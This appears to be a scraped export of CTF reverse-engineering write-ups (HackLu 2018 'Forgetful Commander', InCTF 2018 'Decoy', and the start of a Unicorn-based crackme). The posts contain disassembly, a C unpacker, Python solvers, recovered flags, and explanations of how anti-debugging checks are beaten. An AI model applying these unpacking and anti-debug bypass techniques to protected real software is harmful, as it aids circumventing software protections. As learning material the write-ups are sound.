ebx 0x0000d128 803c2c61 cmp byte [esp + ebp], 0x61 ; 'a' 0x0000d12c 0f9dc3 setge bl 0x0000d12f 803c2c7a cmp byte [esp + ebp], 0x7a ; 'z' 0x0000d133 0f9ec7 setle bh 0x0000d136 802c2c57 sub byte [esp + ebp], 0x57 ; 'W' 0x0000d13a 32142c xor dl, byte [esp + ebp] 0x0000d13d 45 inc ebp 0x0000d13e 84fb test bl, bh 0x0000d140 0f85adffffff jne 0xd0f3 0x0000d146 4d dec ebp 0x0000d147 32142c xor dl, byte [esp + ebp] 0x0000d14a 80042c61 add byte [esp + ebp], 0x61 ; 'a' 0x0000d14e 31db xor ebx, ebx 0x0000d150 803c2c41 cmp byte [esp + ebp], 0x41 ; 'A' 0x0000d154 0f9dc3 setge bl 0x0000d157 803c2c5a cmp byte [esp + ebp], 0x5a ; 'Z' 0x0000d15b 0f9ec7 setle bh 0x0000d15e 802c2c37 sub byte [esp + ebp], 0x37 ; '7' 0x0000d162 32142c xor dl, byte [esp + ebp] 0x0000d165 45 inc ebp 0x0000d166 84fb test bl, bh 0x0000d168 0f8585ffffff jne 0xd0f3 This loop parses the address pointed to by ecx into edx. The base address of the map\n0x0000d183 85d2 test edx, edx 0x0000d185 0f8445000000 je 0xd1d0 0x0000d18b 81c250200000 add edx, 0x2050 0x0000d191 899424245000. mov dword [arg_5024h], edx ; return addr 0x0000d198 83ea50 sub edx, 0x50 0x0000d19b 89c5 mov ebp, eax ; eax = 0 0x0000d19d 40 inc eax 0x0000d19e 40 inc eax ; CODE XREF from entry0 (0xd1c2) 0x0000d19f be78756c46 mov esi, 0x466c7578 ; 'xulF' 0x0000d1a4 31db xor ebx, ebx 0x0000d1a6 39e8 cmp eax, ebp 0x0000d1a8 0f8419000000 je 0xd1c7 0x0000d1ae b900040000 mov ecx, 0x400 ; CODE XREF from entry0 (0xd1bf) 0x0000d1b3 311a xor dword [edx], ebx 0x0000d1b5 3132 xor dword [edx], esi 0x0000d1b7 c1ce08 ror esi, 8 0x0000d1ba 8b1a mov ebx, dword [edx] 0x0000d1bc 83c204 add edx, 4 0x0000d1bf e2f2 loop 0xd1b3 0x0000d1c1 48 dec eax 0x0000d1c2 e9d8ffffff jmp 0xd19f Return address is edx+0x2050. This loop decrypts the 2*4K bytes or 2 pages mapped from 0x2000 and then jumps to edx+0x2050.\n┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/hacklu/ForgetfulCommander/public] └──╼ $ readelf --program-headers forgetful_commander Elf file type is DYN (Shared object file) Entry point 0xd000 There are 12 program headers, starting at offset 52 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align ... LOAD 0x002000 0x00002000 0x00002000 0x00338 0x00338 RWE 0x1000 LOAD 0x003000 0x00003000 0x00003000 0x004f0 0x004f0 RW 0x1000 ... So we need to decrypt 0x338 bytes at offset 0x2000 and 0x4f0 bytes at offset 0x3000\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; void decrypt(char* base, size_t size) { uint32_t* addr = (uint32_t*) mem; uint32_t k = 0; uint32_t u = \u0026#39;Flux\u0026#39;; size \u0026gt;\u0026gt;= 2; for (int j = 0; j \u0026lt; size; ++j) { *addr ^= k^u; asm volatile (\u0026#34;rorl $8, %0\u0026#34; :: \u0026#34;m\u0026#34;(u)); k = *addr++; } } int main() { int file = open(\u0026#34;forgetful_commander\u0026#34;, 0); int file_size = 0x338 \u0026gt;\u0026gt; 2; struct stat sBuf; fstat(file, \u0026amp;sBuf); char* mem = mmap(0, sBuf.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, file, 0); decrypt(mem+0x2000, 0x338); decrypt(mem+0x3000, 0x4f0); int outfile = open(\u0026#34;forgetful\u0026#34;, O_WRONLY|O_CREAT|O_TRUNC, 0777); write(outfile, mem, sBuf.st_size); munmap(mem, sBuf.st_size); close(outfile); close(file); } Now lets open \u0026lsquo;forgetful\u0026rsquo; in radare and disassemble at offset 0x2050.\n;-- section..text: 0x00002050 31ed xor ebp, ebp 0x00002052 5e pop esi 0x00002053 89e1 mov ecx, esp 0x00002055 83e4f0 and esp, 0xfffffff0 0x00002058 50 push eax 0x00002059 54 push esp 0x0000205a 52 push edx 0x0000205b e822000000 call __pc_thunk_bx 0x00002060 81c3a02f0000 add ebx, 0x2fa0 0x00002066 8d8320d3ffff lea eax, [ebx - 0x2ce0] 0x0000206c 50 push eax 0x0000206d 8d83c0d2ffff lea eax, [ebx - 0x2d40] 0x00002073 50 push eax 0x00002074 51 push ecx 0x00002075 56 push esi 0x00002076 ffb3f8ffffff push dword [ebx - 8] ; 0x2190 0x0000207c e8bfffffff call sym.imp.__libc_start_main 0x00002081 f4 hlt Great ! This is the new entry point. Lets move on to main which is at offset 0x2190\n0x00002190 55 push ebp 0x00002191 89e5 mov ebp, esp 0x00002193 53 push ebx 0x00002194 57 push edi 0x00002195 56 push esi 0x00002196 83ec2c sub esp, 0x2c ; ',' 0x00002199 e800000000 call __get_pc_thunk_ebx 0x0000219e 58 pop eax 0x0000219f 81c0622e0000 add eax, 0x2e62 ; eax = 0x5000 0x000021a5 8b4d0c mov ecx, dword [arg_ch] ; argv 0x000021a8 8b5508 mov edx, dword [arg_8h] ; argc 0x000021ab c745f0000000. mov dword [local_10h], 0 0x000021b2 837d0802 cmp dword [arg_8h], 2 0x000021b6 8945d8 mov dword [local_28h], eax 0x000021b9 894dd4 mov dword [local_2ch], ecx 0x000021bc 8955d0 mov dword [local_30h], edx 0x000021bf 0f840c000000 je 0x21d1 0x000021c5 c745f0010000. mov dword [local_10h], 1 ; exit code 0x000021cc e9d7000000 jmp 0x22a8 So we need to pass 2 arguments to the commander. Lets to to 0x21d1\u0026hellip;\n0x000021d1 c745ec000000. mov dword [local_14h], 0 0x000021d8 c745e8050000. mov dword [local_18h], 5 0x000021df c745e4050000. mov dword [local_1ch], 5 0x000021e6 c745e0000000. mov dword [local_20h], 0 0x000021ed 8b45e0 mov eax, dword [local_20h] ; loop counter 0x000021f0 8b4d0c mov ecx, dword [arg_ch] 0x000021f3 8b4904 mov ecx, dword [ecx + 4] 0x000021f6 89e2 mov edx, esp 0x000021f8 890a mov dword [edx], ecx 0x000021fa 8b5dd8 mov ebx, dword [local_28h] 0x000021fd 8945cc mov dword [local_34h], eax 0x00002200 e82bfeffff call sym.imp.strlen 0x00002205 8b4dcc mov ecx, dword [local_34h] 0x00002208 39c1 cmp ecx, eax ; local_20h \u0026lt; len(argv[1]) 0x0000220a 0f837b000000 jae 0x228b 0x00002210 8b450c mov eax, dword [arg_ch] 0x00002213 8b4004 mov eax, dword [eax + 4] 0x00002216 8b4de0 mov ecx, dword [local_20h] 0x00002219 8a1408 mov dl, byte [eax + ecx] 0x0000221c 8855df mov byte [local_21h], dl ; argv[1][local_20h] 0x0000221f 8b45e8 mov eax, dword [local_18h] Here\u0026rsquo;s some anti-debugging code\n0x00002222 9c pushfd 0x00002223 5a pop edx 0x00002224 89d1 mov ecx, edx 0x00002226 81e100010000 and ecx, 0x100 ; EFLAGS.Trap ; Clear EFLAGS.Trap from edx 0x0000222c 31ca xor edx, ecx ; Copy EFLAGS.Trap to EFLAGS.ZeroFlag 0x0000222e c1c902 ror ecx, 2 0x00002231 31ca xor edx, ecx 0x00002233 52 push edx 0x00002234 89c2 mov edx, eax 0x00002236 9d popfd ; ecx = 0x100 \u0026gt;\u0026gt; 2 i.e. 0x40 if EFLAGS.Trap is set 0x00002237 0f44d1 cmove edx, ecx 0x0000223a 89d0 mov eax, edx 0x0000223c 8945e8 mov dword [local_18h], eax So, local_18h is 0x40 if EFLAGS.Trap is set otherwise 0x05\n0x0000223f 0fbe45df movsx eax, byte [local_21h] 0x00002243 8b4de0 mov ecx, dword [local_20h] 0x00002246 8b75d8 mov esi, dword [local_28h] ; offset 0x5000 0x00002249 0fbe8c0ef1e3. movsx ecx, byte [esi + ecx - 0x1c0f] 0x00002251 8b7de8 mov edi, dword [local_18h] 0x00002254 8b5de0 mov ebx, dword [local_20h] 0x00002257 0faf5de4 imul ebx, dword [local_1ch] 0x0000225b 01df add edi, ebx 0x0000225d 0fbebc3e08e0. movsx edi, byte [esi + edi - 0x1ff8] 0x00002265 31f9 xor ecx, edi 0x00002267 39c8 cmp eax, ecx 0x00002269 0f8509000000 jne 0x2278 0x0000226f 8b45ec mov eax, dword [local_14h] 0x00002272 83c001 add eax, 1 0x00002275 8945ec mov dword [local_14h], eax ; CODE XREF from sub.strlen_19e (0x2269) 0x00002278 e900000000 jmp 0x227d ; CODE XREF from sub.strlen_19e (0x2278) 0x0000227d 8b45e0 mov eax, dword [local_20h] 0x00002280 83c001 add eax, 1 0x00002283 8945e0 mov dword [local_20h], eax 0x00002286 e962ffffff jmp 0x21ed Okay, this is a simple validation loop\nm = 5 if debugging: m = 0x40 for i in xrange(len(sys.argv[1])): argv[1][i] == ((base+0x3008)[5*i+m] ^ (base+0x33f1)[i]) ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/hacklu/ForgetfulCommander/public] └──╼ $ cat solve.py #!/usr/bin/env python def getFlag(text, size, isDebugging=False): ans = \u0026#39;\u0026#39; delta = 5 + 0x3b*isDebugging for i in xrange(size): ans += chr(ord(text[5*i+delta+0x3008])^ord(text[i+0x33f1])) return ans with open(\u0026#39;forgetful\u0026#39;, \u0026#39;rb\u0026#39;) as f: data = f.read() print \u0026#39;[*] Flag -\u0026#39;, getFlag(data, 58) # if we have the trap flag set, we get print \u0026#39;[*] Fake Flag -\u0026#39;, getFlag(data, 58, True) ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/hacklu/ForgetfulCommander/public] └──╼ $ python solve.py [*] Flag - flag{Just_type__Please__and_the_missles_will_be_launched.} [*] Fake Flag - This_is_not_the_flag._Tough_luck.......................... Yay !!\n","date":"2018-10-19T00:00:00+05:30","permalink":"http://localhost:1313/post/hacklu-2018-forgetful-commander/","title":"HackLu 2018 - Forgetful Commander"},{"content":"It\u0026rsquo;s a beautiful challenge. But there is an interesting thing about this challenge. The author has tried to make a binary tree out of the basic blocks.\nLet\u0026rsquo;s get started \u0026hellip;\n.text:00403411 call sub_4017DE .text:00403416 mov [esp+70h+var_4], eax .text:0040341A cmp [esp+70h+var_4], 4 .text:0040341F jz loc_403957 .text:00403425 mov dword ptr [esp], offset aInput ; \u0026quot;\\nInput: \u0026quot; .text:0040342C call printf .text:00403431 mov eax, ds:_iob .text:00403436 mov [esp+8], eax ; File .text:0040343A mov dword ptr [esp+4], 2Dh ; MaxCount .text:00403442 lea eax, [esp+70h+Buf] .text:00403446 mov [esp], eax ; Buf .text:00403449 call fgets .text:00403957 loc_403957: .text:00403957 mov dword ptr [esp], offset aInput ; \u0026quot;\\nInput: \u0026quot; .text:0040395E call printf .text:00403963 mov eax, ds:_iob .text:00403968 mov [esp+8], eax ; File .text:0040396C mov dword ptr [esp+4], 2Dh ; MaxCount .text:00403974 lea eax, [esp+70h+Buf] .text:00403978 mov [esp], eax ; Buf .text:0040397B call fgets .text:00403980 lea eax, [esp+70h+Buf] .text:00403984 mov [esp+70h+input], eax Oh ! Both looks similar. Which one to follow ??? sub_4017DE knows the answer.\n.text:004017E4 mov [ebp+var_1C], 0BEEFh .text:004017EB mov [ebp+var_20], 0DEADh .text:004017F2 mov [ebp+var_24], 0DECh .text:004017F9 lea eax, [ebp+var_1C] .text:004017FC mov [ebp+var_10], eax .text:004017FF lea eax, [ebp+var_20] .text:00401802 mov [ebp+var_14], eax .text:00401805 lea eax, [ebp+var_24] .text:00401808 mov [ebp+var_18], eax .text:0040180B mov eax, [ebp+var_18] .text:0040180E mov [esp+8], eax .text:00401812 mov eax, [ebp+var_14] .text:00401815 mov [esp+4], eax .text:00401819 mov eax, [ebp+var_10] .text:0040181C mov [esp], eax .text:0040181F call sub_401723 Nothing much to explain here. Let\u0026rsquo;s move on\n.text:00401704 push ebp .text:00401705 mov ebp, esp .text:00401707 sub esp, 8 .text:0040170A mov eax, ds:IsDebuggerPresent .text:0040170F call eax ; IsDebuggerPresent .text:00401711 test eax, eax .text:00401713 jz short good_boy .text:00401715 mov eax, 0Dh .text:0040171A jmp short locret_401721 .text:0040171C good_boy: .text:0040171C mov eax, 0Eh .text:00401721 .text:00401721 locret_401721: .text:00401721 leave .text:00401722 retn So, we want sub_401704 to return 0xE\n.text:00401729 call sub_401704 .text:0040172E mov [ebp+debugger], eax .text:00401731 mov [ebp+var_10], 0Bh .text:00401738 cmp [ebp+debugger], 0Ah .text:0040173C jle short loc_40178E There was no necessary for if else here. Well, its contributing to the binary tree :-)\n.text:0040173E mov eax, [ebp+arg_0] ; addr of 1st int .text:00401741 mov edx, [eax] .text:00401743 mov eax, [ebp+arg_4] ; addr of 2nd int .text:00401746 mov eax, [eax] .text:00401748 add edx, eax .text:0040174A mov eax, [ebp+arg_8] ; addr of 3rd int .text:0040174D mov eax, [eax] .text:0040174F add edx, eax .text:00401751 mov eax, [ebp+debugger] .text:00401754 add eax, edx .text:00401756 mov [ebp+var_10], eax .text:00401759 sub [ebp+var_10], 24F6h .text:00401760 mov ecx, [ebp+var_10] .text:00401763 mov edx, 21195767h .text:00401768 mov eax, ecx .text:0040176A imul edx .text:0040176C sar edx, 7 .text:0040176F mov eax, ecx .text:00401771 sar eax, 1Fh .text:00401774 sub edx, eax .text:00401776 mov eax, edx .text:00401778 imul eax, 990 ; 1 + (2**39 / 0x21195767) .text:0040177E sub ecx, eax ; mod 990 .text:00401780 mov eax, ecx .text:00401782 mov [ebp+var_10], eax .text:00401785 add [ebp+var_10], 4 .text:00401789 mov eax, [ebp+var_10] This code returns\n (var_1C+var_20+var_24+debugger-0x24f6) % 990 + 4 .text:00401824 mov [ebp+var_C], eax .text:00401827 mov eax, [ebp+var_1C] .text:0040182A cmp eax, 2710h .text:0040182F jle short loc_401867 ; false .text:00401831 mov eax, [ebp+var_20] .text:00401834 cmp eax, 0C350h .text:00401839 jle short loc_401851 ; false .text:0040183B mov eax, [ebp+var_24] .text:0040183E cmp eax, 7A120h .text:00401843 jle short loc_40184B ; true .text:0040184B loc_40184B: .text:0040184B sub [ebp+var_C], 0Ah .text:0040184F jmp short loc_40189B The first two conditions are false as the variables are not modified by sub_401723. To sum up sub_4017DE, it returns\necho $(( (0xbeef+0xdead+0xdec+0xe-0x24f6) % 990 + 4 - 10)) # =\u0026gt; 4 Lets now go back to main. Recall that\n.text:00403416 mov [esp+70h+var_4], eax .text:0040341A cmp [esp+70h+var_4], 4 .text:0040341F jz loc_403957 ; true :-) Scroll up a bit and you can see the some lines in the listing of loc_403957. It first reads a string of length atmost 0x2d into Buf.\n.text:00403990 lea eax, [esp+70h+Buf] .text:00403994 mov [esp], eax ; char * .text:00403997 call length .text:0040399C mov [esp+70h+var_20], eax .text:004039A0 cmp [esp+70h+var_20], 22 .text:004039A5 jle badBoy .text:004039AB mov eax, [esp+70h+input] .text:004039AF add eax, 0Bh .text:004039B2 mov [esp], eax .text:004039B5 call sub_4018D9 .text:004039BA mov [esp+70h+var_C], eax .text:004039BE cmp [esp+70h+var_C], 0Bh .text:004039C3 jnz loc_403C4F The length of the input must be atleast 23 characters. Let\u0026rsquo;s take a look at sub_4018D9\n.text:00401904 loc_401904: .text:00401904 mov edx, [ebp+var_4] .text:00401907 mov eax, [ebp+arg_0] ; input+11 .text:0040190A add eax, edx .text:0040190C movzx eax, byte ptr [eax] .text:0040190F xor eax, 11 .text:00401912 mov ecx, eax .text:00401914 lea edx, [ebp+var_1C] .text:00401917 mov eax, [ebp+var_4] .text:0040191A add eax, edx .text:0040191C mov [eax], cl ; var_1C[var_4] = input[11+var_4]^11 .text:0040191E add [ebp+var_4], 1 .text:00401922 .text:00401922 loc_401922: .text:00401922 cmp [ebp+var_4], 0Ah .text:00401926 jle short loc_401904 .text:00401931 loc_401931: .text:00401931 lea edx, [ebp+var_1C] .text:00401934 mov eax, [ebp+var_4] .text:00401937 add eax, edx .text:00401939 movzx eax, byte ptr [eax] .text:0040193C xor eax, 19 .text:0040193F mov ecx, eax .text:00401941 lea edx, [ebp+var_1C] .text:00401944 mov eax, [ebp+var_4] .text:00401947 add eax, edx .text:00401949 mov [eax], cl ; var_1C[var_4] ^= 19 .text:0040194B add [ebp+var_4], 1 .text:0040194F .text:0040194F loc_40194F: .text:0040194F cmp [ebp+var_4], 0Ah .text:00401953 jle short loc_401931 .text:0040195E loc_40195E: .text:0040195E mov eax, [ebp+var_8] .text:00401961 add eax, offset aFWlgL ; \u0026quot;#f}wLG{ L} \u0026quot; .text:00401966 movzx eax, byte ptr [eax] .text:00401969 xor eax, 11 .text:0040196C mov ecx, eax .text:0040196E lea edx, [ebp+var_28] .text:00401971 mov eax, [ebp+var_8] .text:00401974 add eax, edx .text:00401976 mov [eax], cl ; var_28[var_8] = aFWlgL[var_8]^11 .text:00401978 add [ebp+var_8], 1 .text:0040197C .text:0040197C loc_40197C: .text:0040197C cmp [ebp+var_8], 0Ah .text:00401980 jle short loc_40195E .text:0040198F loc_40198F: .text:0040198F lea edx, [ebp+var_1C] .text:00401992 mov eax, [ebp+var_C] .text:00401995 add eax, edx .text:00401997 movzx edx, byte ptr [eax] .text:0040199A lea ecx, [ebp+var_28] .text:0040199D mov eax, [ebp+var_C] .text:004019A0 add eax, ecx .text:004019A2 movzx eax, byte ptr [eax] .text:004019A5 cmp dl, al ; var_28[var_C] == var_1C[var_C] .text:004019A7 jnz short loc_4019B3 .text:004019A9 add [ebp+status], 1 .text:004019AD add [ebp+var_C], 1 .text:004019B1 jmp short loc_4019BE .text:004019B3 .text:004019B3 loc_4019B3: .text:004019B3 mov [ebp+status], 0 .text:004019BA add [ebp+var_C], 1 .text:004019BE .text:004019BE loc_4019BE: .text:004019BE cmp [ebp+var_C], 0Ah .text:004019C2 jle short loc_40198F At 0x004039BE, we see that the status returned by the above routine must be 11. Now we can find input[11:]\n\u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.join(map(lambda i: chr(ord(i)^19), \u0026#34;#f}wLG{ L} \u0026#34;)) \u0026#39;0und_Th3_n3\u0026#39; .text:004039C9 mov eax, [esp+70h+input] .text:004039CD mov [esp], eax .text:004039D0 call sub_401AB9 .text:004039D5 mov [esp+70h+var_10], eax .text:004039D9 cmp [esp+70h+var_10], 0Bh .text:004039DE jz loc_403B06 Now sub_401AB9 must return 11 \u0026hellip;\n.text:00401AE5 loc_401AE5: .text:00401AE5 mov eax, [ebp+var_C] .text:00401AE8 add eax, 6 .text:00401AEB mov ecx, [ebp+var_8] .text:00401AEE mov edx, [ebp+arg_0] .text:00401AF1 add edx, ecx .text:00401AF3 movzx edx, byte ptr [edx] .text:00401AF6 add edx, 4 ; var_24[var_C+6] = 4+input[var_8] .text:00401AF9 mov [ebp+eax+var_24], dl .text:00401AFD mov eax, [ebp+var_8] .text:00401B00 lea edx, [eax+5] .text:00401B03 mov eax, [ebp+arg_0] .text:00401B06 add eax, edx .text:00401B08 movzx eax, byte ptr [eax] .text:00401B0B add eax, 2 .text:00401B0E mov ecx, eax .text:00401B10 lea edx, [ebp+var_24] .text:00401B13 mov eax, [ebp+var_C] .text:00401B16 add eax, edx .text:00401B18 mov [eax], cl ; var_24[var_C] = 2+input[var_8+5] .text:00401B1A add [ebp+var_8], 1 .text:00401B1E add [ebp+var_C], 1 .text:00401B22 .text:00401B22 loc_401B22: .text:00401B22 cmp [ebp+var_8], 0 .text:00401B26 js short loc_401B2E ; can never be true .text:00401B28 cmp [ebp+var_8], 4 .text:00401B2C jle short loc_401AE5 .text:00401B2E mov eax, [ebp+arg_0] .text:00401B31 add eax, 10 .text:00401B34 movzx eax, byte ptr [eax] .text:00401B37 add eax, 2 .text:00401B3A mov [ebp+var_1F], al So, we have\nvar_24 = { input[5]+2, input[6]+2, input[7]+2, input[8]+2, input[9]+2, input[10]+2, /* var_1F */ input[0]+4, input[1]+4, input[2]+4, input[3]+4, input[4]+4 } .text:00401B48 loc_401B48: .text:00401B48 mov eax, [ebp+var_14] .text:00401B4B add eax, offset a2wahmrgxj ; \u0026quot;}[2waHmrgxj\u0026quot; .text:00401B50 movzx ebx, byte ptr [eax] .text:00401B53 mov edx, [ebp+var_10] ; zero .text:00401B56 mov eax, [ebp+var_14] .text:00401B59 lea ecx, [edx+eax] .text:00401B5C mov edx, 2E8BA2E9h .text:00401B61 mov eax, ecx .text:00401B63 imul edx .text:00401B65 sar edx, 1 .text:00401B67 mov eax, ecx .text:00401B69 sar eax, 1Fh .text:00401B6C sub edx, eax .text:00401B6E mov eax, edx .text:00401B70 shl eax, 2 .text:00401B73 add eax, edx .text:00401B75 add eax, eax .text:00401B77 add eax, edx .text:00401B79 sub ecx, eax ; 1 + (2**33 / 0x2e8ba2e9) .text:00401B7B mov edx, ecx ; mod 11 .text:00401B7D lea eax, [ebp+var_24] .text:00401B80 add eax, edx .text:00401B82 movzx eax, byte ptr [eax] .text:00401B85 cmp bl, al ; var_24[var_14 % 11] == a2wahmrgxj[var_14] .text:00401B87 jnz short loc_401B8D .text:00401B89 add [ebp+status], 1 .text:00401B8D .text:00401B8D loc_401B8D: .text:00401B8D add [ebp+var_14], 1 .text:00401B91 .text:00401B91 loc_401B91: .text:00401B91 cmp [ebp+var_14], 0Ah .text:00401B95 jle short loc_401B48 Therefore, first 11 characters are\n\u0026gt;\u0026gt;\u0026gt; s = \u0026#34;}[2waHmrgxj\u0026#34; \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.join(map(lambda i: chr(ord(i)-4), s[6:]) + map(lambda i: chr(ord(i)-2), s[:6])) \u0026#39;inctf{Y0u_F\u0026#39; So, the input string now is \u0026quot;inctf{Y0u_F0und_Th3_n3\u0026quot;\n.text:00403B06 loc_403B06: .text:00403B06 call sub_4018A0 ; 2*IsDebuggerPresent() .text:00403B0B mov [esp+70h+var_8], eax .text:00403B0F cmp [esp+70h+var_8], 0 .text:00403B14 jnz loc_403BC8 .text:00403B1A lea eax, [esp+70h+Buf] .text:00403B1E mov [esp], eax ; char * .text:00403B21 call length .text:00403B26 mov [esp+70h+var_20], eax .text:00403B2A cmp [esp+70h+var_20], 44 .text:00403B2F jnz bad_boy .text:00403B35 mov dword ptr [esp], 0Ah ; Ch .text:00403B3C call putchar The length of the input must be 44. Now we have to find the last 22 characters of the input string.\n.text:00403B41 mov eax, [esp+70h+input] .text:00403B45 add eax, 33 .text:00403B48 mov [esp], eax .text:00403B4B call sub_401E73 .text:00403B50 mov [esp+70h+var_14], eax .text:00403B54 cmp [esp+70h+var_14], 0Bh .text:00403B59 jnz short loc_403B90 Similar piece of code. It validates the last 11 characters of the input.\n.text:00401EBC mov edx, [ebp+var_C] .text:00401EBF mov eax, [ebp+arg_0] .text:00401EC2 add eax, edx .text:00401EC4 movzx eax, byte ptr [eax] ; copy input[33:] .text:00401EC7 lea ecx, [ebp+var_2A] ; to a local buffer .text:00401ECA mov edx, [ebp+var_C] .text:00401ECD add edx, ecx .text:00401ECF mov [edx], al .text:00401ED1 add [ebp+var_C], 1 .text:00401ED5 .text:00401ED5 loc_401ED5: .text:00401ED5 cmp [ebp+var_C], 0Ah .text:00401ED9 jle short loc_401EBC .text:00401EE4 loc_401EE4: .text:00401EE4 lea edx, [ebp+var_2A] .text:00401EE7 mov eax, [ebp+var_C] .text:00401EEA add eax, edx .text:00401EEC movzx eax, byte ptr [eax] .text:00401EEF mov edx, eax .text:00401EF1 mov eax, [ebp+var_10] ; constant = 1 .text:00401EF4 add eax, edx .text:00401EF6 mov ecx, eax .text:00401EF8 lea edx, [ebp+var_2A] .text:00401EFB mov eax, [ebp+var_C] .text:00401EFE add eax, edx .text:00401F00 mov [eax], cl ; var_2A[var_C]++ .text:00401F02 add [ebp+var_C], 1 .text:00401F06 loc_401F06: .text:00401F06 cmp [ebp+var_C], 0Ah .text:00401F0A jle short loc_401EE4 .text:00401F0C mov dword ptr [esp+8], 0Bh ; MaxCount .text:00401F14 lea eax, [ebp+var_2A] .text:00401F17 mov [esp+4], eax .text:00401F1B lea eax, [ebp+var_1F] .text:00401F1E mov [esp], eax .text:00401F21 call strncmp ; var_2A == var_1F Great ! Now we get the last 11 characters :-)\n\u0026gt;\u0026gt;\u0026gt; var_1F = \u0026#34;\\x7b\\x60\\x49\\x35\\x7a\\x25\\x75\\x35\\x64\\x4c\\x7e\u0026#34; \u0026gt;\u0026gt;\u0026gt; var_1F \u0026#39;{`I5z%u5dL~\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.join(map(lambda i: chr(ord(i)-1), var_1F)) \u0026#39;z_H4y$t4cK}\u0026#39; The string found till now is \u0026quot;inctf{Y0u_F0und_Th3_n3???????????z_H4y$t4cK}\u0026quot;\nNow we need to find input[22:33]\n.text:00403B5B mov eax, [esp+70h+input] .text:00403B5F add eax, 22 .text:00403B62 mov [esp], eax .text:00403B65 call sub_4024C3 .text:00403B6A mov [esp+70h+var_18], eax .text:00403B6E cmp [esp+70h+var_18], 0Bh .text:00403B73 jz short loc_403B7F ; must be true [ ... snip ... ] .text:004024D8 mov [ebp+var_10], 0Ah .text:0040256E loc_40256E: .text:0040256E mov eax, [ebp+var_10] .text:00402571 mov eax, [ebp+eax*4+var_6C] ; input[22+var_10] .text:00402575 xor eax, [ebp+var_8] .text:00402578 mov edx, eax .text:0040257A mov eax, [ebp+var_10] .text:0040257D mov [ebp+eax*4+var_6C], edx ; input[22+var_10]^var_8 .text:00402581 mov eax, [ebp+var_10] .text:00402584 mov eax, [ebp+eax*4+var_6C] .text:00402588 mov [ebp+var_8], eax .text:0040258B mov eax, [ebp+var_10] .text:0040258E mov edx, [ebp+eax*4+var_6C] .text:00402592 mov eax, [ebp+var_10] .text:00402595 mov eax, [ebp+eax*4+var_40] .text:00402599 cmp edx, eax .text:0040259B jnz short loc_4025A1 .text:0040259D add [ebp+status], 1 .text:004025A1 .text:004025A1 loc_4025A1: .text:004025A1 sub [ebp+var_10], 1 .text:004025A5 .text:004025A5 loc_4025A5: .text:004025A5 cmp [ebp+var_10], 0 .text:004025A9 jns short loc_40256E .text:004025AB mov eax, [ebp+status] The above code, works like this\nint k = 1; for (int i = 10; i \u0026gt;= 0; --i) { k = var_6C[i] ^= k; status += var_40[i] == var_6C[i]; } i.e., var_6C[i]^var_6C[i+1] == var_40[i]\nor var_6C[i] = var_40[i]^var_40[i+1], i \u0026lt; 10\n\u0026gt;\u0026gt;\u0026gt; s = map(ord, \u0026#34;\\x6e\\x5d\\x39\\x55\\x66\\x39\\x70\\x1e\\x41\\x15\\x7d\u0026#34;) \u0026gt;\u0026gt;\u0026gt; print \u0026#39;\u0026#39;.join(map(lambda (i, j): chr(i^j), zip(s, s[1:]+[1]))) 3dl3_In_Th| So, the input string is \u0026quot;inctf{Y0u_F0und_Th3_n33dl3_In_Th|z_H4y$t4cK}\u0026quot;, which is also the flag :-) Finally, the path to the leaf node is\n","date":"2018-10-11T00:00:00+05:30","permalink":"http://localhost:1313/post/inctf-2018-decoy/","title":"InCTF 2018 - Decoy"},{"content":"Opening the file in IDA, we can see the program reads two strings (one for each stage), and validates them.\nStage-1 Validation .text:0000000000400E93 mov rax, 787D6B6F613D7478h .text:0000000000400E9D mov qword ptr [rbp+var_20], rax .text:0000000000400EA1 mov rax, 3C7E617D73617E3Dh .text:0000000000400EAB mov [rbp+var_18], rax .text:0000000000400EAF mov [rbp+var_10], 7D77783Ch .text:0000000000400EB6 mov rax, [rbp+s] ; first argument .text:0000000000400EBA mov rdi, rax ; s .text:0000000000400EBD call _strlen .text:0000000000400EC2 add rax, 5 .text:0000000000400EC6 add rax, rax .text:0000000000400EC9 cmp rax, 32h .text:0000000000400ECD jz short loc_400EE8 .text:0000000000400ECF mov edi, offset aInvalidLength ; \u0026quot;\\nInvalid Length\u0026quot; .text:0000000000400ED4 mov eax, 0 .text:0000000000400ED9 call _printf .text:0000000000400EDE mov edi, 0 ; status .text:0000000000400EE3 call _exit Cool, we have a magic array at var_20 and the string length must be 25.\n.text:0000000000400EE8 lea rax, [rbp+var_28] .text:0000000000400EEC mov rdx, rax .text:0000000000400EEF mov esi, 0 ; UC_MODE_ARM .text:0000000000400EF4 mov edi, 1 ; UC_ARCH_ARM .text:0000000000400EF9 call _uc_open .text:0000000000400EFE mov [rbp+var_2C], eax .text:0000000000400F01 cmp [rbp+var_2C], 0 .text:0000000000400F05 jz short loc_400F32 .text:0000000000400F07 mov eax, [rbp+var_2C] .text:0000000000400F0A mov edi, eax .text:0000000000400F0C call _uc_strerror Great! it seems like the stage 1 is gonna execute some arm instructions\n.text:0000000000400F32 mov rax, [rbp+var_28] .text:0000000000400F36 mov ecx, 7 .text:0000000000400F3B mov edx, 200000h .text:0000000000400F40 mov esi, 10000h .text:0000000000400F45 mov rdi, rax .text:0000000000400F48 call _uc_mem_map .text:0000000000400F4D mov rax, [rbp+var_28] .text:0000000000400F51 mov ecx, 48h .text:0000000000400F56 mov edx, offset unk_4016B0 .text:0000000000400F5B mov esi, 10000h .text:0000000000400F60 mov rdi, rax .text:0000000000400F63 call _uc_mem_write .text:0000000000400F68 mov rax, [rbp+s] ; string argument .text:0000000000400F6C mov rdi, rax ; s .text:0000000000400F6F call _strlen .text:0000000000400F74 mov rcx, rax .text:0000000000400F77 mov rax, [rbp+var_28] .text:0000000000400F7B mov rdx, [rbp+s] .text:0000000000400F7F mov esi, 11000h .text:0000000000400F84 mov 